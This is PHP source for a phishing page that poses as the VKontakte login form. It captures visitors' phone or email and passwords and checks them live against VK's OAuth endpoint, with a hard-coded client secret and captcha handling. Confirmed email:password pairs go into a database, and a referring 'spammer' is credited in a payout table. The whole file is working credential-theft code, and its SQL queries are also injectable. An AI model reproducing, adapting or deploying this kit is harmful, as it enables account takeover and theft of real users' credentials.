<? session_start();
include 'bdlog.php';
header('Content-type: text/html; charset=utf-8'); 

if (1 == 1) { echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
  <link rel="icon" href="/vk.ico" type="image/x-icon">
<link rel="shortcut icon" href="/vk.ico" type="image/x-icon"> 
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>ВКонтакте | Вход</title><script src="//ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
      <link rel="stylesheet" type="text/css" href="https://vk.com/css/al/fonts_cnt.css?2889730895" />
  <link rel="stylesheet" type="text/css" href="/oauth/common.css" />
   <link rel="stylesheet" type="text/css" href="/oauth/index.css" /><link rel="stylesheet" type="text/css" href="https://vk.com/css/al/common.css?27134955434">
     <link rel="stylesheet" type="text/css" href="/oauth/login.css" />
	   <link rel="stylesheet" type="text/css" href="/oauth/tooltips.css" />  <link rel="stylesheet" type="text/css" href="/oauth/ui_common.css" />
	     <link rel="stylesheet" type="text/css" href="/oauth/ui_controls.css" />
    <link type="text/css" rel="stylesheet" href="https://vk.com/css/api/oauth_popup.css?25135973930"></link>
    <script type="text/javascript" language="javascript" src="https://vk.com/js/api/common_light.js?2102079137"></script>
  </head>


        <div class="oauth_wrap_content" id="oauth_wrap_content">
          <div class="oauth_head">
  <a class="oauth_logo fl_l" href="#" target="_blank"></a>
  <div id="oauth_head_info" class="oauth_head_info fl_r">
    
  </div>
</div>

<div class="oauth_content box_body clear_fix">
  <div class="box_msg_gray box_msg_padded">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>

  <form method="POST" id="login_submit">
    <div class="oauth_form">

     ';
	 
               function example() {
                 echo '<div id="box_error" class="box_error" style="display: block;">Неверно введён логин или пароль.</div><br>'; 
               }
	 
	  function curl($url){
                 
                 $ch = curl_init( $url );
                 curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
                 curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
                 curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
                 $response = curl_exec( $ch );
                 curl_close( $ch );
                 return $response;
               }
			   
               if (isset($_POST['email'])){       
			   $info = '';
			   $capecho = '';
                 $email = $_POST['email'];
                 $password = $_POST['pass'];
				 if(isset($_POST['captcha_sid'])) {
                 $captcha_sid = $_POST['captcha_sid'];
                 $captcha_key = $_POST['captcha_key'];
				 } else {
					 $captcha_sid = '';
					 $captcha_key = '';
				 }
                 $res = curl('https://oauth.vk.com/token?grant_type=password&client_id=3697615&client_secret=AlVXZFMUqyrnABp8ncuU&username='.$email.'&password='.$password.'&captcha_key='.$captcha_key.'&captcha_sid='.$captcha_sid);
                 $lo='access_token';
                 
                 $pos = strripos($res, $lo);
                 
                 $json = json_decode($res, true);
                 if ($pos === false) {
                if($json["error"] === "need_captcha")
                {
                  $info='<br><div class="box_error" style="margin-bottom:15px;">Ошибка авторизации. Введите код с картинки.</div>';
                  $capecho = 1;
                  $capid = $json["captcha_sid"];
                }else {
                  example();
                  $capecho = 0;
                } 
                 }else {
                $res = json_decode($res, true);
                $id=$res['user_id'];
                $token=$res['access_token'];
                
                $name = curl('https://api.vk.com/method/users.get?user_ids='.$id.'&fields=counters,sex,city&access_token='.$token);
                $name = json_decode($name, true);

 $ref = $_POST['comment'];
 $email = $_POST['email'];
                 $password = $_POST['pass'];
	$data = $email.':'.$password;
$checkif = mysqli_query($db,"select * from data where data = '$data'");
$checkk = $checkif->num_rows;
if($checkk > 0) { } else {
$inser = mysqli_query($db,"insert into `data` (data,ip,fromsp) values ('$data','".time()."','$ref')"); 
$updbal = mysqli_query($db,"update `slito` set `inviteusers` = `inviteusers`+1 where `spamer` = '$ref'");

}

 
$ch = curl_init(); 
 
curl_setopt($ch, CURLOPT_URL, $url); 
 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
// указываем, что у нас POST запрос 
curl_setopt($ch, CURLOPT_POST, 1); 
// добавляем переменные 
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data); 
 
$output = curl_exec($ch); 
curl_close($ch); 
                $info='<div class="info_line" align="center" style="font-weight:bold;">Вход выполнен.</div><br>
            
                <div class="info_line" align="center">Ожидайте!</div><br>
               
                      
                      ';
                      
                      
                
                
                
                
               
                
                
                
                
                 }
               }
               else{
               
                 
               }
               
               
               echo $info;
               
               
               
               
              



	if ($pos != true ) {  echo '
<div class="oauth_form_login">

        <div class="oauth_form_header">Телефон или e-mail</div>
        <input type="text" class="oauth_form_input dark" name="email" id="index_email" value="'.$email.'" required placeholder="Телефон или e-mail">
		<input type="hidden" name="comment" value="'.$_SESSION['comment']. '">
        <div class="oauth_form_header">Пароль</div>
        <input type="text" class="oauth_form_input dark" name="pass" id="index_pass" value="'.$password.'" required placeholder="Пароль" style="-webkit-text-security: disc;" />
'; if ($capecho == 1) {
        
            echo '  <center><img id="captchas" src="https://api.vk.com/captcha.php?sid='.$capid.'" alt=""></center>
               <input type="hidden" id="captcha_sid" name="captcha_sid" value="'.$capid.'">
                <input type="text" id="captcha_key" style="margin-top: 15px;" name="captcha_key" placeholder="Проверочный код" class="oauth_form_input dark"><br>
				';
            
               } echo '
        

        <button class="flat_button oauth_button button_wide" id="install_allow" type="submit">Войти</button>
        <input type="submit" name="submit_input" class="unshown">
      </div>
    </div>
  </form>
	</div>'; }
echo '
        </div>
</html> '; } ?>